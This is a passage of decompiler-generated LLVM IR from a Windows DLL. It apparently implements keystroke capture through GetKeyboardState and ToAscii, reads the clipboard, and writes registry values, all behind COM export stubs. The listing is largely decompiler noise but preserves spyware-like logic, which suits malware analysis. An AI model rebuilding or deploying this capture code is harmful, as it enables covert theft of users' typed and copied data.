  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !619
  br i1 %3, label %dec_label_pc_404db2, label %dec_label_pc_404d6d, !insn.addr !619

dec_label_pc_404d6d:                              ; preds = %dec_label_pc_404d38
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !620
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !621
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404de0, i32 0, i32 0), i32 -2147483647), !insn.addr !621
  %6 = icmp eq i32 %5, 0, !insn.addr !622
  %7 = icmp eq i1 %6, false, !insn.addr !623
  br i1 %7, label %dec_label_pc_404da9, label %dec_label_pc_404d99, !insn.addr !623

dec_label_pc_404d99:                              ; preds = %dec_label_pc_404d6d
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !624
  br label %dec_label_pc_404da9, !insn.addr !624

dec_label_pc_404da9:                              ; preds = %dec_label_pc_404d99, %dec_label_pc_404d6d
  %9 = call i32 @function_404374(), !insn.addr !625
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !625
  br label %dec_label_pc_404db2, !insn.addr !625

dec_label_pc_404db2:                              ; preds = %dec_label_pc_404da9, %dec_label_pc_404d38
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !626
}

define i32 @function_404dbb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404dbb:
  %esp.1.reg2mem = alloca i32, !insn.addr !627
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !627
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !627
  %6 = inttoptr i32 %3 to i32*, !insn.addr !627
  store i32 %5, i32* %6, align 4, !insn.addr !627
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !628
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !628
  %11 = add i8 %8, %10, !insn.addr !628
  %12 = inttoptr i32 %9 to i8*, !insn.addr !628
  store i8 %11, i8* %12, align 1, !insn.addr !628
  %13 = add i32 %1, 122, !insn.addr !629
  %14 = inttoptr i32 %13 to i8*, !insn.addr !629
  %15 = load i8, i8* %14, align 1, !insn.addr !629
  %16 = udiv i32 %4, 256, !insn.addr !629
  %17 = trunc i32 %16 to i8, !insn.addr !629
  %18 = add i8 %15, %17, !insn.addr !629
  store i8 %18, i8* %14, align 1, !insn.addr !629
  %19 = load i8, i8* %7, align 4, !insn.addr !630
  %20 = load i32, i32* %eax, align 4, !insn.addr !630
  %21 = trunc i32 %20 to i8, !insn.addr !630
  %22 = add i8 %19, %21, !insn.addr !630
  %23 = icmp eq i8 %22, 0, !insn.addr !630
  %24 = inttoptr i32 %20 to i8*, !insn.addr !630
  store i8 %22, i8* %24, align 1, !insn.addr !630
  %25 = trunc i32 %3 to i16, !insn.addr !631
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !631
  br i1 %23, label %26, label %dec_label_pc_404dc9, !insn.addr !632

; <label>:26:                                     ; preds = %dec_label_pc_404dbb
  %27 = call i32 @unknown_4e40(), !insn.addr !632
  br label %dec_label_pc_404dc9, !insn.addr !632

dec_label_pc_404dc9:                              ; preds = %26, %dec_label_pc_404dbb
  %28 = icmp ult i8 %22, %19, !insn.addr !630
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !633
  store i32 %29, i32* %eax, align 4, !insn.addr !633
  br i1 %28, label %dec_label_pc_404e31, label %dec_label_pc_404dcc, !insn.addr !634

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404dc9
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !635, !insn.addr !630
  %31 = and i8 %30, 1, !insn.addr !630
  %32 = icmp eq i8 %31, 0, !insn.addr !630
  %33 = trunc i32 %arg4 to i16, !insn.addr !636
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !636
  %35 = inttoptr i32 %2 to i32*, !insn.addr !636
  store i32 %34, i32* %35, align 4, !insn.addr !636
  br i1 %32, label %dec_label_pc_404e2c, label %dec_label_pc_404dd0, !insn.addr !637

dec_label_pc_404dd0:                              ; preds = %dec_label_pc_404dcc
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !638
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !639
  %36 = add i32 %arg4, 1, !insn.addr !640
  %37 = icmp eq i32 %36, 0, !insn.addr !640
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !641
  br i1 %37, label %dec_label_pc_404e37, label %dec_label_pc_404dd6, !insn.addr !641

dec_label_pc_404dd6:                              ; preds = %dec_label_pc_404dd0
  %38 = load i32, i32* %eax, align 4, !insn.addr !642
  %39 = add i32 %38, -1, !insn.addr !642
  store i32 %39, i32* %eax, align 4, !insn.addr !642
  %40 = trunc i32 %36 to i16, !insn.addr !643
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !643
  %42 = load i32, i32* %41, align 4, !insn.addr !643
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !643
  %43 = load i32, i32* %41, align 4, !insn.addr !644
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !644
  %44 = add i32 %arg7, 105, !insn.addr !645
  %45 = inttoptr i32 %44 to i8*, !insn.addr !645
  %46 = load i8, i8* %45, align 1, !insn.addr !645
  %47 = trunc i32 %39 to i8, !insn.addr !645
  %48 = add i8 %46, %47, !insn.addr !645
  %49 = icmp ult i8 %48, %46, !insn.addr !645
  store i8 %48, i8* %45, align 1, !insn.addr !645
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !646
  br i1 %49, label %dec_label_pc_404e57, label %dec_label_pc_404de4, !insn.addr !646

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404dd6
  %50 = icmp eq i8 %48, 0, !insn.addr !645
  br i1 %50, label %dec_label_pc_404e06, label %dec_label_pc_404de6, !insn.addr !647

dec_label_pc_404de6:                              ; preds = %dec_label_pc_404de4
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !648
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e57

dec_label_pc_404e06:                              ; preds = %dec_label_pc_404de4
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !649
  %53 = load i32, i32* %52, align 4, !insn.addr !649
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !649
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !650
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !651
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !652
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !653
  %55 = add i32 %arg6, -8, !insn.addr !654
  %56 = inttoptr i32 %55 to i32*, !insn.addr !654
  store i32 0, i32* %56, align 4, !insn.addr !654
  %57 = add i32 %arg6, -12, !insn.addr !655
  %58 = inttoptr i32 %57 to i32*, !insn.addr !655
  store i32 1, i32* %58, align 4, !insn.addr !655
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !656
  ret i32 %57, !insn.addr !656

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404dcc
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !657

dec_label_pc_404e31:                              ; preds = %dec_label_pc_404dc9
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !658
  %62 = add i8 %60, %61, !insn.addr !658
  %63 = inttoptr i32 %2 to i8*, !insn.addr !658
  store i8 %62, i8* %63, align 1, !insn.addr !658
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !659
  %65 = load i8, i8* %64, align 1, !insn.addr !659
  %66 = udiv i32 %arg3, 256, !insn.addr !659
  %67 = trunc i32 %66 to i8, !insn.addr !659
  %68 = add i8 %65, %67, !insn.addr !659
  store i8 %68, i8* %64, align 1, !insn.addr !659
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !659
  br label %dec_label_pc_404e37, !insn.addr !659

dec_label_pc_404e37:                              ; preds = %dec_label_pc_404e31, %dec_label_pc_404dd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !660
  %70 = inttoptr i32 %69 to i32*, !insn.addr !660
  store i32 0, i32* %70, align 4, !insn.addr !660
  %71 = add i32 %esp.0, -8, !insn.addr !661
  %72 = inttoptr i32 %71 to i32*, !insn.addr !661
  store i32 0, i32* %72, align 4, !insn.addr !661
  %73 = add i32 %esp.0, -12, !insn.addr !662
  %74 = inttoptr i32 %73 to i32*, !insn.addr !662
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* %74, align 4, !insn.addr !662
  %75 = add i32 %esp.0, -16, !insn.addr !663
  %76 = inttoptr i32 %75 to i32*, !insn.addr !663
  store i32 -2147483647, i32* %76, align 4, !insn.addr !663
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !664
  %78 = call i32 @function_4034c8(), !insn.addr !665
  %79 = add i32 %78, 1, !insn.addr !666
  %80 = add i32 %esp.0, -20, !insn.addr !667
  %81 = inttoptr i32 %80 to i32*, !insn.addr !667
  store i32 %79, i32* %81, align 4, !insn.addr !667
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !668
  br label %dec_label_pc_404e57, !insn.addr !668

dec_label_pc_404e57:                              ; preds = %dec_label_pc_404de6, %dec_label_pc_404e37, %dec_label_pc_404dd6
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !669
  %83 = add i32 %esp.1.reload, -4, !insn.addr !670
  %84 = inttoptr i32 %83 to i32*, !insn.addr !670
  store i32 %82, i32* %84, align 4, !insn.addr !670
  %85 = add i32 %esp.1.reload, -8, !insn.addr !671
  %86 = inttoptr i32 %85 to i32*, !insn.addr !671
  store i32 1, i32* %86, align 4, !insn.addr !671
  %87 = add i32 %esp.1.reload, -12, !insn.addr !672
  %88 = inttoptr i32 %87 to i32*, !insn.addr !672
  store i32 0, i32* %88, align 4, !insn.addr !672
  %89 = add i32 %esp.1.reload, -16, !insn.addr !673
  %90 = inttoptr i32 %89 to i32*, !insn.addr !673
  store i32 ptrtoint ([10 x i8]* @global_var_404eb8 to i32), i32* %90, align 4, !insn.addr !673
  %91 = add i32 %arg6, -8, !insn.addr !674
  %92 = inttoptr i32 %91 to i32*, !insn.addr !674
  %93 = load i32, i32* %92, align 4, !insn.addr !674
  %94 = add i32 %esp.1.reload, -20, !insn.addr !675
  %95 = inttoptr i32 %94 to i32*, !insn.addr !675
  store i32 %93, i32* %95, align 4, !insn.addr !675
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !676
  %97 = load i32, i32* %92, align 4, !insn.addr !677
  %98 = add i32 %esp.1.reload, -24, !insn.addr !678
  %99 = inttoptr i32 %98 to i32*, !insn.addr !678
  store i32 %97, i32* %99, align 4, !insn.addr !678
  %100 = call i32 @function_404374(), !insn.addr !679
  %101 = load i32, i32* %99, align 4, !insn.addr !680
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !681
  store i32 4214421, i32* %90, align 4, !insn.addr !682
  %102 = call i32 @"@LStrClr"(), !insn.addr !683
  ret i32 %102, !insn.addr !684
}

define i32 @function_404e8e() local_unnamed_addr {
dec_label_pc_404e8e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !685
  ret i32 %0, !insn.addr !685
}

define i32 @function_404e93() local_unnamed_addr {
dec_label_pc_404e93:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !686
}

define i32 @function_404e95() local_unnamed_addr {
dec_label_pc_404e95:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !687
}

define i32 @function_404e99(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e99:
  %.reg2mem = alloca i32, !insn.addr !688
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !688
  %5 = inttoptr i32 %2 to i8*, !insn.addr !688
  store i8 %4, i8* %5, align 1, !insn.addr !688
  %6 = add i32 %0, 111, !insn.addr !689
  %7 = inttoptr i32 %6 to i8*, !insn.addr !689
  %8 = load i8, i8* %7, align 1, !insn.addr !689
  %9 = trunc i32 %1 to i8, !insn.addr !689
  %10 = add i8 %8, %9, !insn.addr !689
  %11 = icmp eq i8 %10, 0, !insn.addr !689
  store i8 %10, i8* %7, align 1, !insn.addr !689
  br i1 %11, label %12, label %dec_label_pc_404ea1, !insn.addr !690

; <label>:12:                                     ; preds = %dec_label_pc_404e99
  %13 = call i32 @unknown_4f18(), !insn.addr !690
  br label %dec_label_pc_404ea1, !insn.addr !690

dec_label_pc_404ea1:                              ; preds = %12, %dec_label_pc_404e99
  %14 = icmp ult i8 %10, %8, !insn.addr !689
  br i1 %14, label %dec_label_pc_404f09, label %dec_label_pc_404ea4, !insn.addr !691

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404ea1
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !635, !insn.addr !689
  %16 = and i8 %15, 1, !insn.addr !689
  %17 = icmp eq i8 %16, 0, !insn.addr !689
  %18 = trunc i32 %arg4 to i16, !insn.addr !692
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !692
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !692
  store i32 %19, i32* %20, align 4, !insn.addr !692
  br i1 %17, label %dec_label_pc_404f04, label %dec_label_pc_404ea8, !insn.addr !693

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404ea4
  %21 = add i32 %arg4, 1, !insn.addr !694
  %22 = icmp eq i32 %21, 0, !insn.addr !694
  store i32 %arg2, i32* %.reg2mem, !insn.addr !695
  br i1 %22, label %dec_label_pc_404f0f, label %dec_label_pc_404eae, !insn.addr !695

dec_label_pc_404eae:                              ; preds = %dec_label_pc_404ea8
  %23 = add i32 %arg2, -1, !insn.addr !696
  %24 = trunc i32 %21 to i16, !insn.addr !697
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !697
  %26 = load i32, i32* %25, align 4, !insn.addr !697
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !697
  %27 = load i32, i32* %25, align 4, !insn.addr !698
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !698
  %28 = add i32 %arg7, 105, !insn.addr !699
  %29 = inttoptr i32 %28 to i8*, !insn.addr !699
  %30 = load i8, i8* %29, align 1, !insn.addr !699
  %31 = trunc i32 %23 to i8, !insn.addr !699
  %32 = add i8 %30, %31, !insn.addr !699
  %33 = icmp eq i8 %32, 0, !insn.addr !699
  store i8 %32, i8* %29, align 1, !insn.addr !699
  br i1 %33, label %dec_label_pc_404ede, label %dec_label_pc_404ebe, !insn.addr !700

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eae
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !701
  %34 = inttoptr i32 %23 to i8*, !insn.addr !702
  %35 = load i8, i8* %34, align 1, !insn.addr !702
  %36 = add i8 %35, %31, !insn.addr !702
  store i8 %36, i8* %34, align 1, !insn.addr !702
  %37 = add i32 %arg5, 86, !insn.addr !703
  %38 = inttoptr i32 %37 to i8*, !insn.addr !703
  %39 = load i8, i8* %38, align 1, !insn.addr !703
  %40 = trunc i32 %21 to i8, !insn.addr !703
  %41 = add i8 %39, %40, !insn.addr !703
  store i8 %41, i8* %38, align 1, !insn.addr !703
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !704
  %42 = call i32 @"@LStrClr"(), !insn.addr !705
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !706
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !707
  %44 = zext i1 %43 to i32, !insn.addr !708
  ret i32 %44, !insn.addr !708

dec_label_pc_404ede:                              ; preds = %dec_label_pc_404eae
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !709
  %46 = inttoptr i32 %45 to i8*, !insn.addr !709
  %47 = load i8, i8* %46, align 2, !insn.addr !709
  %48 = mul i8 %47, 2, !insn.addr !709
  store i8 %48, i8* %46, align 2, !insn.addr !709
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !710
  %50 = icmp eq i32* %49, null, !insn.addr !711
  br i1 %50, label %dec_label_pc_404f09, label %dec_label_pc_404eee, !insn.addr !712

dec_label_pc_404eee:                              ; preds = %dec_label_pc_404ede
  %51 = ptrtoint i32* %49 to i32, !insn.addr !710
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !713
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !714
  %53 = icmp eq i32* %52, null, !insn.addr !715
  br i1 %53, label %dec_label_pc_404f09, label %dec_label_pc_404efa, !insn.addr !716

dec_label_pc_404efa:                              ; preds = %dec_label_pc_404eee
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !717
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !718
  br label %dec_label_pc_404f04, !insn.addr !718

dec_label_pc_404f04:                              ; preds = %dec_label_pc_404efa, %dec_label_pc_404ea4
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !719
  br label %dec_label_pc_404f09, !insn.addr !719

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404f04, %dec_label_pc_404eee, %dec_label_pc_404ede, %dec_label_pc_404ea1
  %56 = call i1 @CloseClipboard(), !insn.addr !720
  %57 = sext i1 %56 to i32, !insn.addr !720
  store i32 %57, i32* %.reg2mem, !insn.addr !721
  br label %dec_label_pc_404f0f, !insn.addr !721

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404ea8, %dec_label_pc_404f09
  %.reload = load i32, i32* %.reg2mem, !insn.addr !722
  ret i32 %.reload, !insn.addr !722
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f14:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !723
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !723
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !724
  %4 = inttoptr i32 %3 to i32*, !insn.addr !725
  %5 = load i32, i32* %4, align 4, !insn.addr !725
  %6 = icmp eq i32 %5, 0, !insn.addr !725
  %7 = icmp eq i1 %6, false, !insn.addr !726
  %8 = icmp eq i1 %7, false, !insn.addr !727
  br i1 %8, label %dec_label_pc_404f50, label %dec_label_pc_404f27, !insn.addr !727

dec_label_pc_404f27:                              ; preds = %dec_label_pc_404f14
  %9 = inttoptr i32 %0 to i8*, !insn.addr !728
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !729
  %11 = icmp eq i32* %10, null, !insn.addr !730
  %12 = icmp eq i1 %11, false, !insn.addr !731
  br i1 %12, label %dec_label_pc_404f50, label %dec_label_pc_404f3a, !insn.addr !731

dec_label_pc_404f3a:                              ; preds = %dec_label_pc_404f27
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220780 to i32*), i32 0, i32* null), !insn.addr !732
  br label %dec_label_pc_404f50, !insn.addr !732

dec_label_pc_404f50:                              ; preds = %dec_label_pc_404f3a, %dec_label_pc_404f27, %dec_label_pc_404f14
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !733
  store i32 0, i32* %15, align 4, !insn.addr !733
  ret i32 -2147221231, !insn.addr !734
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f7c:
  ret i32 0, !insn.addr !735
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f80:
  ret i32 0, !insn.addr !736
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f84:
  ret i32 0, !insn.addr !737
}

define i32 @function_404f88() local_unnamed_addr {
dec_label_pc_404f88:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !738
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !738
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !738
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !739
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !740
  %3 = add i32 %2, 1, !insn.addr !740
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !740
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !741
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !742
  ret i32 0, !insn.addr !743
}

define i32 @function_404fad() local_unnamed_addr {
dec_label_pc_404fad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !744
  ret i32 %0, !insn.addr !744
}

define i32 @function_404fb2() local_unnamed_addr {
dec_label_pc_404fb2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !745
}

define i32 @function_404fb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !746
}

define i32 @function_404fb8() local_unnamed_addr {
dec_label_pc_404fb8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !747
  %2 = add i32 %1, -1, !insn.addr !747
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !747
  ret i32 %0, !insn.addr !748
}

define i32 @function_404fc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fc0:
  %esp.0.reg2mem = alloca i32, !insn.addr !749
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !750
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !750
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !750
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !751
  %4 = call i32 @function_407250(), !insn.addr !752
  %5 = icmp ne i32 %4, 0, !insn.addr !753
  %6 = icmp eq i1 %5, false, !insn.addr !754
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !755
  br i1 %6, label %dec_label_pc_4050bb, label %dec_label_pc_404ffd, !insn.addr !755

dec_label_pc_404ffd:                              ; preds = %dec_label_pc_404fc0
  switch i32 %0, label %dec_label_pc_405047 [
    i32 8, label %dec_label_pc_40500b
    i32 46, label %dec_label_pc_40502a
  ]

dec_label_pc_40500b:                              ; preds = %dec_label_pc_404ffd
  %7 = call i32 @function_4072ec(), !insn.addr !756
  %8 = call i32 @"@LStrDelete"(), !insn.addr !757
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !758
  br label %dec_label_pc_4050bb, !insn.addr !758

dec_label_pc_40502a:                              ; preds = %dec_label_pc_404ffd
  %9 = call i32 @function_4072ec(), !insn.addr !759
  %10 = call i32 @"@LStrDelete"(), !insn.addr !760
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !761
  br label %dec_label_pc_4050bb, !insn.addr !761

dec_label_pc_405047:                              ; preds = %dec_label_pc_404ffd
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !762
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !763
  %14 = udiv i32 %1, 65536, !insn.addr !764
  %15 = and i32 %14, 255, !insn.addr !765
  %16 = inttoptr i32 %15 to i16*, !insn.addr !766
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !767
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !768
  %19 = icmp eq i32 %18, 1, !insn.addr !769
  %20 = icmp eq i1 %19, false, !insn.addr !770
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !770
  br i1 %20, label %dec_label_pc_4050bb, label %dec_label_pc_405073, !insn.addr !770

dec_label_pc_405073:                              ; preds = %dec_label_pc_405047
  %21 = call i32 @function_406fb4(), !insn.addr !771
  %22 = icmp eq i32 %21, 0, !insn.addr !772
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !773
  br i1 %22, label %dec_label_pc_4050bb, label %dec_label_pc_40507f, !insn.addr !773

dec_label_pc_40507f:                              ; preds = %dec_label_pc_405073
  %23 = call i32 @function_4034c8(), !insn.addr !774
  %24 = icmp sgt i32 %23, 15, !insn.addr !775
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !775
  br i1 %24, label %dec_label_pc_4050bb, label %dec_label_pc_405090, !insn.addr !775

dec_label_pc_405090:                              ; preds = %dec_label_pc_40507f
  %25 = call i32 @function_4072ec(), !insn.addr !776
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !777
  %27 = call i32 @"@LStrInsert"(), !insn.addr !778
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !778
  br label %dec_label_pc_4050bb, !insn.addr !778

dec_label_pc_4050bb:                              ; preds = %dec_label_pc_405090, %dec_label_pc_40507f, %dec_label_pc_405073, %dec_label_pc_405047, %dec_label_pc_40502a, %dec_label_pc_40500b, %dec_label_pc_404fc0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !779
  %29 = load i32, i32* %28, align 4, !insn.addr !779
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !780
  %30 = add i32 %esp.0.reload, 8, !insn.addr !781
  %31 = inttoptr i32 %30 to i32*, !insn.addr !781
  store i32 4215003, i32* %31, align 4, !insn.addr !781
  %32 = call i32 @"@LStrClr"(), !insn.addr !782
  ret i32 %32, !insn.addr !783
}

define i32 @function_4050d4() local_unnamed_addr {
dec_label_pc_4050d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !784
  ret i32 %0, !insn.addr !784
}

define i32 @function_4050d9() local_unnamed_addr {
dec_label_pc_4050d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !785
}

define i32 @function_4050db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !786
}

define i32 @function_4050e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050e4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !787
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !787
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !787
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !788
  %2 = call i32 @function_407250(), !insn.addr !789
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !790
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !791
  %4 = add i32 %1, 8, !insn.addr !792
  %5 = inttoptr i32 %4 to i32*, !insn.addr !792
  store i32 4215210, i32* %5, align 4, !insn.addr !792
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !793
  ret i32 %6, !insn.addr !794
}

define i32 @function_4051a3() local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !795
  ret i32 %0, !insn.addr !795
}

define i32 @function_4051a8() local_unnamed_addr {
dec_label_pc_4051a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !796
}

define i32 @function_4051aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4051aa:
